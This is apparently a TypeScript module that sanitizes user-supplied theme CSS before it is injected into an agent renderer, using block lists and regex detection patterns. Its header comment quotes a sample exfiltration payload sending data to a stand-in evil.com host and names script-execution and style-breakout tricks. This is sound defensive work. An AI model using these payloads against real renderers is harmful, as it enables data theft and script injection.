// SPDX-License-Identifier: MPL-2.0

/**
 * # Safe-CSS Sanitizer
 *
 * Validates and strips malicious CSS before it reaches a live CDP
 * injection into an agent renderer. Without this, a user importing a
 * third-party theme.json with a crafted `custom.css` field could:
 *
 *   - Exfiltrate data via `background: url('https://evil.com/?leak=...')`.
 *   - Execute JS in older Edge/IE via `expression(...)` or `behavior: url(...)`.
 *   - Phish with `data:text/html` URL payloads.
 *   - Hang the renderer with catastrophic-backtracking selectors or
 *     `@import` loops.
 *   - Override `-webkit-app-region: drag` to trap the user in a fake title bar.
 *
 * ## Approach
 *
 * We use defense-in-depth — both a property blocklist and a value scan.
 * It is **not** a parser; regex-based. It errs on the side of stripping —
 * safe CSS survives with cosmetic-only edits.
 *
 * ## Limits
 *
 *   - Does NOT parse selector specificity; malicious selectors targeting
 *     real app classes slip through if they use benign properties. This is
 *     acceptable because our injection scope is already constrained to our
 *     own `--agentskin-*` custom properties in practice.
 * - `@font-face` URLs are blocked; system fonts only. Themes that ship
 *     Custom fonts must register them through ThemeStudio, not inject raw CSS.
 *
 * ## Integration points
 *
 *   1. ImageToThemePanel's "自定义 CSS" textarea — call `sanitizeCSS` on blur.
 *   2. StudioProject `palette.customCSS` — call `sanitizeCSS` on persist.
 *   3. RealDomPreview overridesToCss — call `sanitizeCSS` before postMessage.
 *
 * Inspired by: Codex-Dream-Skin's Safe-CSS guard, DOMPurify's CSS path,
 * CSP3 `style-src 'unsafe-inline'` threat model.
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

/** Beyond this size the CSS is almost certainly a packed exploit. */
export const MAX_CSS_LENGTH = 64 * 1024; // 64 KiB

/** Per-rule property count ceiling. */
export const MAX_DECL_COUNT = 2_000;

/** Output longer than this after stripping indicates aggressive attack. */
export const SANITIZE_HARD_LIMIT = 256 * 1024;

/** Properties blocked entirely — they can load code or alter page lifecycle. */
const BLOCKED_PROPERTIES = new Set([
  // Script / behavior (IE / old Edge)
  'behavior',
  '-ms-behavior',
  'binding',
  // App-drag hijack (Electron / Chromium)
  '-webkit-app-region',
  // Mixed-threat: pointer-events can be OK but 'none' on overlay traps users
  'pointer-events',
]);

/** Values containing these substrings are stripped per-declaration. */
const BLOCKED_VALUE_PATTERNS: RegExp[] = [
  /javascript:/i,
  /vbscript:/i,
  /data:text\/html/i,
  /data:application\/xhtml/i,
  /expression\s*\(/i, // IE CSS expression()
  /@import/i, // can import unbounded external CSS
  /@charset/i, // redundant + used in UTF-7 XSS
  /-moz-binding/i, // Firefox XBL
  /<\/style/i, // closing-tag injection
];

/** Properties whose values are scanned for URL-based exfil. */
const URL_HOSTILE_CHECK = /url\s*\(\s*['"]?\s*(https?:)/i;

// ---------------------------------------------------------------------------
// Threat detection
// ---------------------------------------------------------------------------

export interface SanitizeResult {
  /** Clean CSS, safe to inject. */
  clean: string;
  /** True if threats were found (UI should surface a warning). */
  blocked: boolean;
  /** Human-readable reasons for the block — useful in the UI. */
  reasons: string[];
}

/**
 * Lightweight structural check before deep scan — rejects garbage / bombs.
 */
function structuralCheck(input: string): { ok: boolean; reason?: string } {
  if (input.length > MAX_CSS_LENGTH) {
    return { ok: false, reason: `CSS exceeds ${MAX_CSS_LENGTH} byte limit` };
  }
  if (/[^\x20-\x7E\t\n\r]/.test(input.replace(/\\[0-9a-fA-F]{1,6}\s?/g, ''))) {
    // allow escaped unicode but flag genuinely unexpected control bytes
    // biome-ignore lint/suspicious/noControlCharactersInRegex: Intentional security check for CSS control bytes
    const bad = input.match(/[\x00-\x08\x0E-\x1F]/g);
    if (bad && bad.length > 5) {
      return { ok: false, reason: 'CSS contains suspicious control characters' };
    }
  }
  return { ok: true };
}

/** Sanitize a CSS string. Pure function — input untouched. */
export function sanitizeCSS(input: string): SanitizeResult {
  const reasons: string[] = [];

  // Empty / whitespace-only is always safe.
  if (!input || !input.trim()) return { clean: '', blocked: false, reasons };

  const struct = structuralCheck(input);
  if (!struct.ok) {
    return { clean: '', blocked: true, reasons: [struct.reason!] };
  }

  // Strip HTML comments (can confuse parsers) + raw </style> breakout.
  // The breakout check must happen before property splitting — the payload
  // `</style><script>...` contains no `:` so our per-decl scan would skip it.
  let css = input.replace(/<!--|-->/g, '');
  if (/<\/style/i.test(css)) {
    reasons.push('Blocked </style> breakout');
    css = css.replace(/<\/style[^>]*>.*?<style[^>]*>/gis, '');
    // Strip remainder to be safe.
    css = css.replace(/<\/?style[^>]*>/gi, '');
  }

  // Walk top-level @rules — we allow @media, @supports, @font-face-block.
  // Naive regex-based; acceptable for a defense-in-depth guardrail.
  css = css.replace(/@font-face\s*\{[^}]*\}/g, () => {
    reasons.push('@font-face blocked: use ThemeStudio font registry');
    return '';
  });

  // Remove disallowed at-rules that load external resources.
  // [^;]+(;)? so the LAST declaration in a CSS (often omitted trailing
  // semicolon) is still caught.
  css = css.replace(/@import\s+[^;]+;?/g, () => {
    reasons.push('@import blocked: can load external CSS');
    return '';
  });
  css = css.replace(/@charset\s+[^;]+;?/g, () => {
    reasons.push('@charset blocked');
    return '';
  });

  // Strip comment lines that tried to sneak parser-busting.
  css = css.replace(/\/\*[\s\S]*?\*\//g, (m) => {
    if (BLOCKED_VALUE_PATTERNS.some((p) => p.test(m))) {
      reasons.push('Blocked comment-contained payload');
      return '';
    }
    // Preserve comments — but blank suspicious URLs outside.
    return m.replace(/url\s*\(\s*['"]?https?:[^)]*\)/g, 'url()');
  });

  // Property-level scan: split on ';' naïvely but skip nested blocks.
  // Each decl is checked; surviving decls are re-joined.
  const decls = splitDeclarations(css);
  if (decls.count > MAX_DECL_COUNT) {
    reasons.push(`Exceeded ${MAX_DECL_COUNT} declarations`);
    return { clean: '', blocked: true, reasons };
  }

  const kept: string[] = [];
  for (const decl of decls.items) {
    const cleaned = sanitizeDeclaration(decl, reasons);
    if (cleaned) kept.push(cleaned);
  }

  const clean = kept.join(';').replace(/;{2,}/g, ';').trim();
  return {
    clean,
    blocked: reasons.length > 0,
    reasons: dedupe(reasons),
  };
}

// ---------------------------------------------------------------------------
// Per-declaration sanitizer
// ---------------------------------------------------------------------------

/**
 * Returns the cleaned declaration, or empty string if it must be dropped.
 * Mutates `reasons` for any encountered threat.
 */
function sanitizeDeclaration(decl: string, reasons: string[]): string {
  const idx = decl.indexOf(':');
  if (idx === -1) return decl; // malformed — let it pass through

  const prop = decl.slice(0, idx).trim().toLowerCase();
  const value = decl.slice(idx + 1);

  // 1. Blocked property entirely.
  if (BLOCKED_PROPERTIES.has(prop)) {
    reasons.push(`Property "${prop}" blocked`);
    return '';
  }

  // 2. Blocked value pattern (works for both prop + value sub-pieces).
  for (const p of BLOCKED_VALUE_PATTERNS) {
    if (p.test(prop) || p.test(value)) {
      reasons.push(`Blocked value pattern in "${prop}"`);
      return '';
    }
  }

  // 3. URL-hostile: external http(s) in url() can leak via CSS loader.
  //    Allow data: images — they don't exfil. Block others in URL-bearing
  //    properties.
  const urlMatch = value.match(URL_HOSTILE_CHECK);
  if (urlMatch) {
    reasons.push(`External URL in "${prop}" blocked`);
    return '';
  }

  // 4. Wrap up — return cleaned.
  return `${prop}:${value}`.replace(/;+\s*$/, '');
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Split CSS into top-level declarations. Naïvely handles nesting — any
 * media/support block boundary is treated as a split so we don't
 * accidentally inject malicious @media rules. The loss is cosmetic-only.
 */
function splitDeclarations(css: string): { items: string[]; count: number } {
  const items: string[] = [];
  let depth = 0;
  let buf = '';
  let escaped = false;

  for (let i = 0; i < css.length; i++) {
    const ch = css[i];
    if (escaped) {
      buf += ch;
      escaped = false;
      continue;
    }
    if (ch === '\\') {
      buf += ch;
      escaped = true;
      continue;
    }
    if (ch === '{') depth++;
    else if (ch === '}') depth--;
    else if (ch === ';' && depth === 0) {
      if (buf.trim()) items.push(buf.trim());
      buf = '';
      continue;
    }
    buf += ch;
  }
  if (buf.trim()) items.push(buf.trim());
  return { items, count: items.length };
}

function dedupe<T>(arr: T[]): T[] {
  return [...new Set(arr)];
}
